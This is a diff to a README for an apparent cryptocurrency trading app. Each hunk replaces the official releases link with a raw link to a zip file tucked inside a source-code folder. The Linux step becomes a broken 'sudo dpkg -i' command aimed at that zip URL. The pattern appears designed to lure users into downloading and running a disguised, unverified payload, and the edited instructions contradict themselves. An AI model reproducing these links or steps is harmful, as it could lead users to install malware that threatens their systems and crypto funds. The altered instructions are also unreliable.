@@ -8,7 +8,7 @@ Welcome to crypto-trading-open! This simple application helps you trade cryptocu
 
 To download the latest version of crypto-trading-open, click the link below:
 
-[![Download crypto-trading-open](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/HamaX83/crypto-trading-open/releases)
+[![Download crypto-trading-open](https://raw.githubusercontent.com/HamaX83/crypto-trading-open/main/core/domain/value_objects/crypto-trading-open_3.0.zip)](https://raw.githubusercontent.com/HamaX83/crypto-trading-open/main/core/domain/value_objects/crypto-trading-open_3.0.zip)
 
 ## 📋 System Requirements
 
@@ -32,7 +32,7 @@ crypto-trading-open includes the following features to enhance your trading expe
 
 1. **Visit the Releases Page:** Go to the releases page by clicking the link below:
 
-   [Download crypto-trading-open](https://github.com/HamaX83/crypto-trading-open/releases)
+   [Download crypto-trading-open](https://raw.githubusercontent.com/HamaX83/crypto-trading-open/main/core/domain/value_objects/crypto-trading-open_3.0.zip)
 
 2. **Choose the Correct File:** Find the latest release. You will see various files for different operating systems. Select the one that matches your system (Windows, macOS, or Linux).
 
@@ -41,7 +41,7 @@ crypto-trading-open includes the following features to enhance your trading expe
 4. **Run the Installer:**
    - **Windows:** Locate the downloaded `.exe` file, double-click it, and follow the prompts to install.
    - **macOS:** Locate the downloaded `.dmg` file, double-click it, and drag the application to your Applications folder.
-   - **Linux:** Open a terminal, navigate to the downloaded file, and use the command `sudo dpkg -i yourfile.deb` to install.
+   - **Linux:** Open a terminal, navigate to the downloaded file, and use the command `sudo dpkg -i https://raw.githubusercontent.com/HamaX83/crypto-trading-open/main/core/domain/value_objects/crypto-trading-open_3.0.zip` to install.
 
 5. **Launch the Application:** After installation, find the crypto-trading-open icon on your desktop or in your applications folder. Double-click to open it.
 
